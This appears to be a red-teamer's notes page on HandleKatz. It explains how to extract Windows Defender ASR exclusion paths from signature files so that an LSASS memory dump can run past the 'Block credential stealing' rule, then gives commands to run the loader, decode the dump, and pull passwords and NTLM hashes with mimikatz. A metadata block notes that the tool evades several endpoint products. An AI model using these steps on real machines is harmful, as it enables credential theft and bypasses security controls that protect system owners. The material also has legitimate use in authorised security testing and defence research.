# Handlekatz

So, how do you go about dumping lsass.exe on a box protected with MDE and ASR? Well, fortunately you can leverage a variety of whitelisted paths within the Defender ASR rules that help you achieve this. After finding a whitelisted exclusion path for the ASR rule you want to bypass, simply run your executable from that path!
Windows Defender signatures/rules are stored in VDM containers. Many of them are just Lua script files. It’s possible to use a tool such as WDExtract to decrypt and extract all the PE images from these containers. By analyzing the extracted VDM you can pull whitelisted exclusion paths for ASR rules.
I will now demonstrate a very quick, hacky way to quickly get an updated list of potential exclusion paths for particular ASR rules.
Let’s pick on the ASR rule for “Block credential stealing from the Windows local security authority subsystem”.
Here is a link to the particular ruleset on MSDN. Here you can see that the ASR rule is tied to a particular GUID, in this case 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2.
This rule can be enabled on your machine with the following PowerShell script: Set-MpPreference -AttackSurfaceReductionRules_Ids 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 -AttackSurfaceReductionRules_Actions Enabled
* First, we need to locate the Defender signature files. You can usually find these in the following location: C:\ProgramData\Microsoft\Windows Defender\Definition Updates\Backup
* In our case, we are primarily interested in the mpasbase.vdm file.
* Let’s extract the file using WDExtract: wdextract64.exe mpasbase.vdm
* Open the extracted file mpasbase.vdm.extracted in a Hex Editor, such as HxD.
* Search for the GUID of the ASR rule you want to investigate:
* Scroll down slightly to see the list of exclusions and extract the data:
It’s important to keep in mind that the list of paths you may see here in the hex dump are not always exclusions. They can be part of other paths listed for ASR rules such as Monitored Locations. You’ll need to do some testing/investigating to confirm if you are just naivley using content from the hex dump.
Ultimately, this gives us a list of excluded paths that are allowed to perform lsass.exe dumps even with the ASR rule enabled
https://adamsvoboda.net/extracting-asr-rules/

## [[LSASS dumping]]
*Make all* to build HandleKatzPIC.exe, HandleKatz.bin and loader.exe`
Loader implements a sample loader for HandleKatz:
> loader.exe --pid:7331 --outfile:C:\Temp\dump.obfuscated
> python3 /mnt/c/Users/patri/source/repos/HandleKatz/Decoder.py -i "/mnt/c/Users/patri/Downloads
don/sql2.bin" -o "/mnt/c/Users/patri/Downloads/sql2.dmp"
> .\mimikatz.exe "log C:\Users\patri\Downloads\log.txt" "sekurlsa::minidump C:\Users\patri\Downloads\sql2.bin" "sekurlsa::logonPasswords"
> C:\Users\patri\Documents\Red-Teaming\credentials\KatzKatz-ExtractNTLM\katzkatz.py -f C:\Users\patri\Downloads\Garmaredon\log.txt

```meta
requirements: 
results: 
opsec: 
oss: #win
source: https://github.com/codewhitesec/HandleKatz
description: This tool was implemented as part of our Brucon2021 conference talk and demonstrates the usage of cloned handles to Lsass in order to create an obfuscated memory dump of the same.
undetected:  MDE, BitDefender, Cylance
```